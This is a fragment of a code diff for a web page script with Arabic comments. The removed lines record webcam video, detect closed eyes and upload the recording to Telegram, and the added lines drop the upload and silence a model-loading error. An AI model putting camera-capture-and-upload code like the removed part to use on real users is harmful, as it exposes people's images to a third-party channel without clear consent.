-      const closed = await detectEyesClosedFromCanvas(snapCanvas);
-      if (closed === null){
-        statusEl.textContent = 'لم نتمكن من تحديد حالة العيون بوضوح.';
-      } else if (closed === true){
-        statusEl.textContent = 'تم الكشف عن أن العيون مغلقة — سيتم إرسال الفيديو.';
-        // نجمع الفيديو كـ Blob
-        const videoBlob = new Blob(recordedBlobs, { type: recordedBlobs[0]?.type || 'video/webm' });
-        // حاول الإرسال من المتصفح (قد يفشل بسبب CORS)
-        const ok = await sendVideoToTelegramBlob(videoBlob);
-        if (!ok){
-          // اقتراح بديل آمن: تحميل الفيديو إلى خادمك الذي يرسل لتلغرام
-          hintEl.textContent = 'اقتراح: استخدم endpoint على الخادم لرفع الفيديو (POST) ومن ثم دعه يرسل الفيديو لتلغرام باستخدام التوكن بأمان.';
-        }
-      } else {
-        statusEl.textContent = 'يبدو أن العيون مفتوحة — لن يتم الإرسال.';
-      }
-
-      // تنظيف
+      // اغلاق الكاميرا ثم اخفاء الـoverlay بعد تأخير قصير
       stopCamera();
-      setTimeout(() => { overlay.style.display = 'none'; isRunning = false; }, 1800);
+      setTimeout(()=>{ overlay.style.display = 'none'; }, 1200);
     }
 
-    startBtn.addEventListener('click', handleStart);
-    cancelBtn.addEventListener('click', () => {
-      if (recorder && recorder.state !== 'inactive') recorder.stop();
-      stopCamera();
-      overlay.style.display = 'none';
-      statusEl.textContent = 'تم الإلغاء';
-      isRunning = false;
+    // أزرار التحكم
+    startBtn.addEventListener('click', async () => {
+      startBtn.disabled = true;
+      try {
+        await runSequence();
+      } finally {
+        startBtn.disabled = false;
+      }
     });
 
-    // تحميل النموذج مسبقاً لتحسين التجربة (اختياري)
-    (async function init(){
-      try{
-        await loadModelWithRetry(1);
-        statusEl.textContent = 'جاهز — اضغط التالي لبدء التسجيل';
-      }catch(e){
-        console.warn('تحميل مبدئي فشل (ليس شرطياً):', e);
-        statusEl.textContent = 'جاهز — قد يستغرق تحميل النموذج عند الضغط لأول مرة.';
+    cancelBtn.addEventListener('click', () => {
+      stopCamera();
+      overlay.style.display = 'none';
+      statusEl.textContent = 'أُلغي';
+    });
+
+    // تحميل النموذج مسبقاً في الخلفية (اختياري) — لا يعرض رسالة فشل، بل يعيد المحاولة بصمت
+    (async function prewarm(){
+      try {
+        await loadModelSilently();
+        // جاهز
+      } catch(e){
+        // لن نعرض رسالة "تأكد من اتصال الإنترنت..." كما طلبت.
+        console.warn('prewarm failed silently', e);
       }
     })();
   </script>
